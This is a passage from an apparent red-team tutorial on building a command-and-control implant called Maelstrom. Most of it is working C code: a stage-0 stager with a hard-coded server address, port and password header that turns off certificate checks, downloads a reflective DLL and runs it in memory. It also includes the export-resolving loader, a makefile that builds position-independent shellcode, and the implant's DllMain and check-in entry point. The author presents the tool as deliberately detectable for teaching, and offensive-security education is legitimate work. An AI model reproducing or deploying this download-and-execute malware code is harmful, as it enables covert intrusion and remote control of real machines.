          <span class="pl-s"><span class="pl-pds">'</span>/<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>a<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>?<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>s<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>t<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>a<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>g<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>e<span class="pl-pds">'</span></span>, <span class="pl-c1">0</span>
        };
        
        WCHAR wUserAgent[<span class="pl-c1">10</span>] = {
          <span class="pl-s"><span class="pl-pds">'</span>M<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>a<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>e<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>l<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>s<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>t<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>r<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>o<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>m<span class="pl-pds">'</span></span>, <span class="pl-c1">0</span>
        };
        
        WCHAR wVersion[<span class="pl-c1">5</span>] = {
          <span class="pl-s"><span class="pl-pds">'</span>H<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>T<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>T<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>P<span class="pl-pds">'</span></span>, <span class="pl-c1">0</span>
        };
        
        WCHAR wServer[<span class="pl-c1">13</span>] = {
          <span class="pl-s"><span class="pl-pds">'</span>1<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>0<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>.<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>1<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>0<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>.<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>1<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>1<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>.<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>2<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>0<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>5<span class="pl-pds">'</span></span>, <span class="pl-c1">0</span>
        };
        
        WCHAR wReferer[<span class="pl-c1">19</span>] = {
          <span class="pl-s"><span class="pl-pds">'</span>h<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>t<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>t<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>p<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>s<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>:<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>/<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>/<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>g<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>o<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>o<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>g<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>l<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>e<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>.<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>c<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>o<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>m<span class="pl-pds">'</span></span>, <span class="pl-c1">0</span>
        };
        
        WCHAR wHeaders[<span class="pl-c1">22</span>] = {
          <span class="pl-s"><span class="pl-pds">'</span>X<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>-<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>M<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>a<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>e<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>l<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>s<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>t<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>r<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>o<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>m<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>:<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span> <span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>p<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>a<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>s<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>s<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>w<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>o<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>r<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>d<span class="pl-pds">'</span></span>, <span class="pl-c1">0</span>
        };
        
        
</code></pre>
<p>These strings are hard-coded in the function has does not support any sort of update. Also, the password in which the server is requiring is hardcoded in the header. Finally, these strings are in the array format so that they are placed within the <code>.text</code> section.</p>
<p>We now create a few variables, including the port:</p>
<pre><code class="language-c">DWORD dwPort = <span class="pl-c1">5555</span>;
        BOOL bSSL = <span class="pl-c1">FALSE</span>;
        BOOL bProxy = <span class="pl-c1">FALSE</span>;
        
        DWORD dwSz = <span class="pl-c1">0</span>;
        DWORD dwDownloaded = <span class="pl-c1">0</span>;
        DWORD dwTotalRead = <span class="pl-c1">0</span>;
        <span class="pl-k">long</span> lpBuffer = -<span class="pl-c1">1</span>;
        DWORD lpdwBufferLength = <span class="pl-k">sizeof</span>(lpBuffer);
        BOOL bSetOptions = <span class="pl-c1">FALSE</span>;
        
        DWORD dwFlagsWinHttpOpenRequest = <span class="pl-c1">0</span>;
        DWORD dwAllowBadCerts = <span class="pl-c1">0</span>;
        
        HINTERNET hSession = <span class="pl-c1">NULL</span>;
        HINTERNET hConnect = <span class="pl-c1">NULL</span>;
        HINTERNET hRequest = <span class="pl-c1">NULL</span>;
        BOOL bSentRequest = <span class="pl-c1">FALSE</span>;
        BOOL bReceieveRequest = <span class="pl-c1">FALSE</span>;
        BOOL bHeadersQueried = <span class="pl-c1">FALSE</span>;
        BOOL bHeadersAdded = <span class="pl-c1">FALSE</span>;
        WINHTTP_AUTOPROXY_OPTIONS autoProxyOptions;
        WINHTTP_PROXY_INFO proxyInfo;
        DWORD dwProxyInfoSz = <span class="pl-k">sizeof</span>(proxyInfo);
        
</code></pre>
<p>We aren't going to step through the code, but there are a few things to point out.</p>
<p>If its SSL, set these flags:</p>
<pre><code class="language-c"><span class="pl-k">if</span> (bSSL) {
            dwFlagsWinHttpOpenRequest = WINHTTP_FLAG_SECURE;
            dwAllowBadCerts = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
        }
        
</code></pre>
<p>And:</p>
<pre><code class="language-c"><span class="pl-k">if</span> (bSSL) {
            bSetOptions = ((WINHTTPSETOPTION)api.<span class="pl-smi">WinHttpSetOption</span>)(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &amp;dwAllowBadCerts, <span class="pl-k">sizeof</span>(dwAllowBadCerts));
            <span class="pl-k">if</span> (bSetOptions == <span class="pl-c1">FALSE</span>) {
                <span class="pl-k">return</span> <span class="pl-c1">FALSE</span>;
            }
        }
        
</code></pre>
<p>Then, this is how headers are added:</p>
<pre><code class="language-c">bHeadersAdded = ((WINHTTPADDREQUESTHEADERS)api.WinHttpAddRequestHeaders)(hRequest, (LPCWSTR)&amp;wHeaders, (DWORD)-<span class="pl-c1">1</span>, WINHTTP_ADDREQ_FLAG_REPLACE | WINHTTP_ADDREQ_FLAG_ADD);
        <span class="pl-k">if</span> (bHeadersAdded == <span class="pl-c1">FALSE</span>) {
            <span class="pl-k">return</span> <span class="pl-c1">FALSE</span>;
        }
        
</code></pre>
<p>If multiple headers are required, then the <code>WCHAR</code> needs to have them in the same string and containing the <code>\r\n</code> as per the RFC.</p>
<p>After the request is done, we fill the structure:</p>
<pre><code class="language-c">Dll-&gt;Buffer = Buffer;
        Dll-&gt;Size = dwTotalRead;
        
        <span class="pl-k">if</span> (Dll-&gt;Size &gt; <span class="pl-c1">0</span>) {
            <span class="pl-k">return</span> <span class="pl-c1">TRUE</span>;
        }
        <span class="pl-k">else</span> {
            <span class="pl-k">return</span> <span class="pl-c1">FALSE</span>;
        }
        
</code></pre>
<p>The entire process is encapsulated in the following request:</p>
<pre><code class="language-c"><span class="pl-k">if</span> (GetReflectiveDLL(Api, &amp;Dll) == <span class="pl-c1">FALSE</span>) {
            <span class="pl-k">return</span> -<span class="pl-c1">1</span>;
        }
        
</code></pre>
<h4>Loading a Reflective DLL</h4>
<p>In the stage 1 section we will discuss why a Reflective DLL was chosen and what it is, but for now lets discuss how it will be loaded. For reference, here is the code used to execute the DLL:</p>
<pre><code class="language-c"><span class="pl-k">int</span> <span class="pl-en">LoadReflectiveDll</span>(API Api, DLL Dll) {
            LPVOID pAddress = <span class="pl-c1">NULL</span>;
            DWORD lpflOldProtect = <span class="pl-c1">0</span>;
            BOOL bProtect = <span class="pl-c1">FALSE</span>;
            DWORD dwLdrOffset = <span class="pl-c1">0</span>;
            PTHREAD_START_ROUTINE pRoutine = <span class="pl-c1">NULL</span>;
            HANDLE hThread = <span class="pl-c1">NULL</span>;
        
            pAddress = ((VIRTUALALLOC)Api.<span class="pl-smi">VirtualAlloc</span>)(<span class="pl-c1">0</span>, Dll.<span class="pl-smi">Size</span>, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        
            <span class="pl-k">if</span> (pAddress == <span class="pl-c1">NULL</span>) {
                <span class="pl-k">return</span> <span class="pl-c1">1</span>;
            }
        
            <span class="pl-c1">Memcpy</span>(pAddress, Dll.<span class="pl-smi">Buffer</span>, Dll.<span class="pl-smi">Size</span>);
        
            bProtect = ((VIRTUALPROTECT)Api.<span class="pl-smi">VirtualProtect</span>)(pAddress, Dll.<span class="pl-smi">Size</span>, PAGE_EXECUTE_READ, &amp;lpflOldProtect);
            <span class="pl-k">if</span> (bProtect == <span class="pl-c1">FALSE</span>) {
                <span class="pl-k">return</span> <span class="pl-c1">1</span>;
            }
        
            dwLdrOffset = <span class="pl-c1">GetReflectiveLoaderOffset</span>(Dll.<span class="pl-smi">Buffer</span>);
            <span class="pl-k">if</span> (dwLdrOffset == <span class="pl-c1">0</span>) {
                <span class="pl-k">return</span> <span class="pl-c1">1</span>;
            }
        
            pRoutine = (LPTHREAD_START_ROUTINE)((ULONG_PTR)pAddress + dwLdrOffset);
        
            hThread = ((CREATETHREAD)Api.<span class="pl-smi">CreateThread</span>)(<span class="pl-c1">NULL</span>, <span class="pl-c1">0</span>, pRoutine, <span class="pl-c1">NULL</span>, <span class="pl-c1">0</span>, <span class="pl-c1">NULL</span>);
            <span class="pl-k">if</span> (hThread == <span class="pl-c1">NULL</span>) {
                <span class="pl-k">return</span> <span class="pl-c1">1</span>;
            }
            ((WAITFORSINGLEOBJECT)Api.<span class="pl-smi">WaitForSingleObject</span>)(hThread, INFINITE);
        
            ((VIRTUALFREE)Api.<span class="pl-smi">VirtualFree</span>)(pAddress, <span class="pl-c1">0</span>, MEM_RELEASE);
            <span class="pl-k">return</span> <span class="pl-c1">0</span>;
        }
        
</code></pre>
<p><code>memcpy</code> is reimplemented using the <a href="https://code.woboq.org/gcc/libgcc/memcpy.c.html">source code</a>:</p>
<pre><code class="language-c"><span class="pl-k">void</span> * <span class="pl-en">Memcpy</span> (<span class="pl-k">void</span> *dest, <span class="pl-k">const</span> <span class="pl-k">void</span> *src, <span class="pl-c1">size_t</span> len)
        {
          <span class="pl-k">char</span> *d = dest;
          <span class="pl-k">const</span> <span class="pl-k">char</span> *s = src;
          <span class="pl-k">while</span> (len--)
            *d++ = *s++;
          <span class="pl-k">return</span> dest;
        }
        
</code></pre>
<p>We discussed this earlier on, but lets revisit. We first need to identify the offset of the export function so we can get the proper address to start a thread on the function:</p>
<pre><code class="language-c">dwLdrOffset = GetReflectiveLoaderOffset(Dll.Buffer);
        <span class="pl-k">if</span> (dwLdrOffset == <span class="pl-c1">0</span>) {
            <span class="pl-k">return</span> <span class="pl-c1">1</span>;
        }
        
        pRoutine = (LPTHREAD_START_ROUTINE)((ULONG_PTR)pAddress + dwLdrOffset);
        
</code></pre>
<p>Lets go over the <code>GetReflectiveLoaderOffset()</code> function.</p>
<p>The function is declared like so:</p>
<pre><code class="language-c">DWORD <span class="pl-en">GetReflectiveLoaderOffset</span>(VOID* lpReflectiveDllBuffer)
        
</code></pre>
<p>The parameter taken in here is the <code>unsigned char*</code> buffer containing the DLL retrieved from the server.</p>
<p>First things first, define the exported function name:</p>
<pre><code class="language-c">CHAR cReflectiveLoader[<span class="pl-c1">17</span>] = {
            <span class="pl-s"><span class="pl-pds">'</span>R<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>e<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>f<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>l<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>e<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>c<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>t<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>i<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>v<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>e<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>L<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>o<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>a<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>d<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>e<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>r<span class="pl-pds">'</span></span>, <span class="pl-c1">0</span>
        };
        
</code></pre>
<p>With that, the next thing that happens is the <a href="https://www.nirsoft.net/kernel_struct/vista/IMAGE_DOS_HEADER.html">IMAGE_DOS_HEADER</a> struct is identified within the buffer:</p>
<pre><code class="language-c">uExportDirectory = uBase + ((PIMAGE_DOS_HEADER)uBase)-&gt;e_lfanew;
        
</code></pre>
<p>The struct:</p>
<pre><code class="language-c"><span class="pl-k">typedef</span> <span class="pl-k">struct</span> _IMAGE_DOS_HEADER
        {
             WORD e_magic;
             WORD e_cblp;
             WORD e_cp;
             WORD e_crlc;
             WORD e_cparhdr;
             WORD e_minalloc;
             WORD e_maxalloc;
             WORD e_ss;
             WORD e_sp;
             WORD e_csum;
             WORD e_ip;
             WORD e_cs;
             WORD e_lfarlc;
             WORD e_ovno;
             WORD e_res[<span class="pl-c1">4</span>];
             WORD e_oemid;
             WORD e_oeminfo;
             WORD e_res2[<span class="pl-c1">10</span>];
             LONG e_lfanew;
        } IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;
        
</code></pre>
<p>From here, the <a href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_nt_headers64">IMAGE_NT_HEADERS</a> are extracted:</p>
<pre><code class="language-c"><span class="pl-k">if</span> (((PIMAGE_NT_HEADERS)uExportDirectory)-&gt;OptionalHeader.Magic == <span class="pl-c1">0x010B</span>) <span class="pl-c">// PE32</span>
        {
            <span class="pl-k">if</span> (dwCompiledArch != <span class="pl-c1">1</span>)
                <span class="pl-k">return</span> <span class="pl-c1">0</span>;
        }
        <span class="pl-k">else</span> <span class="pl-k">if</span> (((PIMAGE_NT_HEADERS)uExportDirectory)-&gt;OptionalHeader.Magic == <span class="pl-c1">0x020B</span>) <span class="pl-c">// PE64</span>
        {
            <span class="pl-k">if</span> (dwCompiledArch != <span class="pl-c1">2</span>)
                <span class="pl-k">return</span> <span class="pl-c1">0</span>;
        }
        <span class="pl-k">else</span>
        {
            <span class="pl-k">return</span> <span class="pl-c1">0</span>;
        }
        
</code></pre>
<p>The struct:</p>
<pre><code class="language-c"><span class="pl-k">typedef</span> <span class="pl-k">struct</span> _IMAGE_NT_HEADERS64 {
          DWORD                   Signature;
          IMAGE_FILE_HEADER       FileHeader;
          IMAGE_OPTIONAL_HEADER64 OptionalHeader;
        } IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;
        
</code></pre>
<p>Extract the export directory, the virtual addresses, and so on:</p>
<pre><code class="language-c">uEntryExport = (UINT_PTR) &amp; ((PIMAGE_NT_HEADERS)uExportDirectory)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
        uExportDirectory = uBase + Rva2Offset(((PIMAGE_DATA_DIRECTORY)uEntryExport)-&gt;VirtualAddress, uBase);
        uEntryExport = uBase + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uExportDirectory)-&gt;AddressOfNames, uBase);
        uAddress = uBase + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uExportDirectory)-&gt;AddressOfFunctions, uBase);
        uOrdinals = uBase + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uExportDirectory)-&gt;AddressOfNameOrdinals, uBase);
        dwNumberOfNames = ((PIMAGE_EXPORT_DIRECTORY)uExportDirectory)-&gt;NumberOfNames;
        
</code></pre>
<p>And then loop over all the exported function names by casting the RVA to an offset:</p>
<pre><code class="language-c"><span class="pl-k">char</span>* exportedFunction = (<span class="pl-k">char</span>*)(uBase + Rva2Offset(DEREF_32(uEntryExport), uBase));
        
</code></pre>
<p>Where <code>RVA2offset()</code> is:</p>
<pre><code class="language-c">DWORD <span class="pl-en">Rva2Offset</span>(DWORD dwRva, UINT_PTR uiBaseAddress)
        {
            WORD wIndex = <span class="pl-c1">0</span>;
            PIMAGE_SECTION_HEADER pSectionHeader = <span class="pl-c1">NULL</span>;
            PIMAGE_NT_HEADERS pNtHeaders = <span class="pl-c1">NULL</span>;
        
            pNtHeaders = (PIMAGE_NT_HEADERS)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)-&gt;<span class="pl-smi">e_lfanew</span>);
        
            pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&amp;pNtHeaders-&gt;<span class="pl-smi">OptionalHeader</span>) + pNtHeaders-&gt;<span class="pl-smi">FileHeader</span>.<span class="pl-smi">SizeOfOptionalHeader</span>);
        
            <span class="pl-k">if</span> (dwRva &lt; pSectionHeader[<span class="pl-c1">0</span>].<span class="pl-smi">PointerToRawData</span>)
                <span class="pl-k">return</span> dwRva;
        
            <span class="pl-k">for</span> (wIndex = <span class="pl-c1">0</span>; wIndex &lt; pNtHeaders-&gt;<span class="pl-smi">FileHeader</span>.<span class="pl-smi">NumberOfSections</span>; wIndex++)
            {
                <span class="pl-k">if</span> (dwRva &gt;= pSectionHeader[wIndex].<span class="pl-smi">VirtualAddress</span> &amp;&amp; dwRva &lt; (pSectionHeader[wIndex].<span class="pl-smi">VirtualAddress</span> + pSectionHeader[wIndex].<span class="pl-smi">SizeOfRawData</span>))
                    <span class="pl-k">return</span> (dwRva - pSectionHeader[wIndex].<span class="pl-smi">VirtualAddress</span> + pSectionHeader[wIndex].<span class="pl-smi">PointerToRawData</span>);
            }
        
            <span class="pl-k">return</span> <span class="pl-c1">0</span>;
        }
        
</code></pre>
<p>Then, using a <a href="https://opensource.apple.com/source/tcl/tcl-14/tcl/compat/strstr.c.auto.html">custom strstr</a>, compare the export name with the one we hardcoded at the start:</p>
<pre><code class="language-c"><span class="pl-k">if</span> (STRSTR(exportedFunction, cReflectiveLoader) != <span class="pl-c1">NULL</span>)
        {
            uAddress = uBase + <span class="pl-c1">Rva2Offset</span>(((PIMAGE_EXPORT_DIRECTORY)uExportDirectory)-&gt;<span class="pl-smi">AddressOfFunctions</span>, uBase);
            uAddress += (<span class="pl-c1">DEREF_16</span>(uOrdinals) * <span class="pl-k">sizeof</span>(DWORD));
            <span class="pl-k">return</span> <span class="pl-c1">Rva2Offset</span>(<span class="pl-c1">DEREF_32</span>(uAddress), uBase);
        }
        
</code></pre>
<p>At this point, there should be some clear OpSec issues, if they're not obvious, we will point them out in the next few sections!</p>
<p>Once this is done, and the base address of the exported function is achieved, we can simple start a thread on it:</p>
<pre><code class="language-c">pRoutine = (LPTHREAD_START_ROUTINE)((ULONG_PTR)pAddress + dwLdrOffset);
        
        hThread = ((CREATETHREAD)api.CreateThread_t)(<span class="pl-c1">NULL</span>, <span class="pl-c1">0</span>, pRoutine, <span class="pl-c1">NULL</span>, <span class="pl-c1">0</span>, <span class="pl-c1">NULL</span>);
        <span class="pl-k">if</span> (hThread == <span class="pl-c1">NULL</span>)
        {
            <span class="pl-k">return</span> <span class="pl-c1">1</span>;
        }
        ((WAITFORSINGLEOBJECT)api.WaitForSingleObject_t)(hThread, INFINITE);
        
</code></pre>
<p>Aside from the glaring IOC here, there is one missing WinAPI call which would operate as a cleanup... More on that in the OpSec review posts.</p>
<h3>Maelstrom's Entry-point</h3>
<p>This is currently how the stager looks:</p>
<pre><code class="language-c"><span class="pl-k">int</span> <span class="pl-en">run</span>() {
        
            API Api = {
                <span class="pl-c1">0</span>
            };
        
            DLL Dll = {
                <span class="pl-c1">0</span>
            };
        
            <span class="pl-k">if</span> (<span class="pl-c1">ResolveAPIs</span>(&amp;Api) == <span class="pl-c1">FALSE</span>) {
                <span class="pl-k">return</span> -<span class="pl-c1">1</span>;
            }
        
        #<span class="pl-k">ifdef</span> SAFE
            <span class="pl-k">if</span> (<span class="pl-c1">SafetyChecks</span>(Api) == <span class="pl-c1">FALSE</span>) {
                <span class="pl-k">return</span> -<span class="pl-c1">1</span>;
            }
        #<span class="pl-k">endif</span>
        
            <span class="pl-k">if</span> (<span class="pl-c1">GetReflectiveDLL</span>(Api, &amp;Dll) == <span class="pl-c1">FALSE</span>) {
                <span class="pl-k">return</span> -<span class="pl-c1">1</span>;
            }
        
            <span class="pl-c1">LoadReflectiveDll</span>(Api, Dll);
        
            <span class="pl-k">return</span> <span class="pl-c1">0</span>;
        }
        
</code></pre>
<p>We deem this as the <em>safe</em> version, as it has all the checks we discussed. As <code>SAFE</code> is a preprocessor definition, we can control whether or not its used by passing the <code>-DSAFE</code> flag to <code>MingW</code>.</p>
<p>The <code>makefile</code>:</p>
<pre><code class="language-makefile"><span class="pl-smi">CC</span>         =   x86_64-w64-mingw32-gcc
        <span class="pl-smi">LINKER</span>      =   x86_64-w64-mingw32-ld
        <span class="pl-smi">OBJCOPY</span>     =   x86_64-w64-mingw32-objcopy
        <span class="pl-smi">FLAGS</span>       =   -m64 -ffunction-sections -fno-asynchronous-unwind-tables -nostdlib -fno-ident -O2 -c
        <span class="pl-smi">LINKERFLAGS</span> =   -Wl,-Tscripts/linker.ld,--no-seh
        <span class="pl-smi">SAFE</span>        =   bin/maelstrom.safe.x64
        <span class="pl-smi">UNSAFE</span>      =   bin/maelstrom.unsafe.x64
        <span class="pl-smi">SOURCE</span>      =   <span class="pl-s">$(<span class="pl-c1">wildcard</span> src/<span class="pl-c1">*</span>.c)</span>
        
        <span class="pl-en">safe</span>:
            nasm -f win64 asm/adjuststack.asm -o bin/adjuststack.o
        
            $(CC) $(SOURCE) $(FLAGS) -DSAFE $(LINKERFLAGS) -o $(SAFE).o
        
            $(LINKER) -s bin/adjuststack.o $(SAFE).o -o $(SAFE).exe
        
            $(OBJCOPY) -O binary --only-section=.text $(SAFE).exe $(SAFE).bin
        
            rm bin/*.o
        
        <span class="pl-en">unsafe</span>:
            nasm -f win64 asm/adjuststack.asm -o bin/adjuststack.o
        
            $(CC) $(SOURCE) $(FLAGS) $(LINKERFLAGS) -o $(UNSAFE).o
        
            $(LINKER) -s bin/adjuststack.o $(UNSAFE).o -o $(UNSAFE).exe
        
            $(OBJCOPY) -O binary --only-section=.text $(UNSAFE).exe $(UNSAFE).bin
        
            rm bin/*.o
        
</code></pre>
<p>For the eagle-eyed, this is fully position-independent and we can show this at the end of the post.</p>
<h2>Stage 1</h2>
<p>Stage 1, or <code>Maelstrom.x64.dll</code>, is the actual implant. As tempting as it is to utilize a typical PE and operate out of <code>main</code>, its probably best not to. If something like <a href="https://github.com/monoxgas/sRDI">sRDI</a> is used, or <a href="https://github.com/TheWover/donut">Donut</a>, they work by bootstrapping the PE. To avoid this, and any other complication, we found a Reflective DLL to be the most effective, and easiest to work with.</p>
<h3>Custom Reflective Loader</h3>
<p>As we discussed earlier on, <a href="https://github.com/stephenfewer/ReflectiveDLLInjection">Stephen Fewer</a> provided the first proof-of-concept of Reflective DLLs. Since then, the community has developed a few iterations:</p>
<ul>
<li><a href="https://github.com/alfarom256/StinkyLoader">StinkyLoader</a></li>
<li><a href="https://github.com/Cracked5pider/KaynLdr/">KaynLdr</a></li>
<li><a href="https://github.com/mgeeky/ElusiveMice/">ElusiveMice</a></li>
<li><a href="https://github.com/SecIdiot/TitanLdr">TitanLdr</a></li>
</ul>
<p>For our demonstration, we will use the original proof-of-concept as this uses common IOCs which we want to keep in the project to ensure that Maelstrom is easily detectable.</p>
<h3>DLLMain</h3>
<p>Once the DLL has been loaded from the Stage 0, <code>DllMain</code> will be:</p>
<pre><code class="language-c">BOOL WINAPI <span class="pl-en">DllMain</span>(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
        {
            HANDLE hThread = <span class="pl-c1">NULL</span>;
            <span class="pl-k">switch</span> (dwReason)
            {
            <span class="pl-k">case</span> DLL_PROCESS_ATTACH:
        
        #<span class="pl-k">ifndef</span> _DEBUG
                hThread = <span class="pl-c1">CreateThread</span>(<span class="pl-c1">NULL</span>, <span class="pl-c1">NULL</span>, Maelstrom, <span class="pl-c1">NULL</span>, <span class="pl-c1">0</span>, <span class="pl-c1">NULL</span>);
                <span class="pl-c1">CloseHandle</span>(hThread);
        #<span class="pl-k">endif</span>
        
            <span class="pl-k">case</span> DLL_PROCESS_DETACH:
            <span class="pl-k">case</span> DLL_THREAD_ATTACH:
            <span class="pl-k">case</span> DLL_THREAD_DETACH:
                <span class="pl-k">break</span>;
            }
            <span class="pl-k">return</span> <span class="pl-c1">TRUE</span>;
        }
        
</code></pre>
<p>When the DLL load reason is <code>DLL_PROCESS_ATTACH</code>, a new thread is created on <code>Maelstrom()</code> which looks like this:</p>
<pre><code class="language-c">DWORD WINAPI <span class="pl-en">Maelstrom</span>()
        {
            <span class="pl-c">// Gather initial info</span>
            PCHAR machineInfo = <span class="pl-c1">GetMachineInfo</span>();
        
            <span class="pl-c">// Check-in</span>
            <span class="pl-k">if</span> (<span class="pl-c1">Initialise</span>(machineInfo) == <span class="pl-c1">FALSE</span>)
            {
                <span class="pl-k">return</span> -<span class="pl-c1">1</span>;
            }
        
            <span class="pl-c">// do some commands</span>
            <span class="pl-c1">Start</span>();
        
            <span class="pl-k">return</span> <span class="pl-c1">0</span>;
        }
        
</code></pre>
<h3>DLL Debugging</h3>
<p>To debug this in Visual Studio, the pre-processor definition of <code>_DEBUG</code> is checked for. If its not present, then allow for the thread to be created. Otherwise we resolve this function:</p>
<pre><code class="language-c">#<span class="pl-k">ifdef</span> _DEBUG
        DLLEXPORT <span class="pl-k">void</span> <span class="pl-en">DebugExport</span>()
        {
            <span class="pl-c1">Maelstrom</span>();
        }
        #<span class="pl-k">endif</span>
        
</code></pre>
<p>And a seperate loader was written to debug it:</p>
<pre><code class="language-c">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>Windows.h<span class="pl-pds">&gt;</span></span>
        
        <span class="pl-k">typedef</span> <span class="pl-en">void</span> (*DebugExport)();
        
        <span class="pl-k">int</span> <span class="pl-en">main</span>(<span class="pl-k">int</span> argc, <span class="pl-k">char</span>* argv[])
        {
            HMODULE hModule = <span class="pl-c1">LoadLibraryA</span>(<span class="pl-s"><span class="pl-pds">"</span>maelstrom.1.dll<span class="pl-pds">"</span></span>);
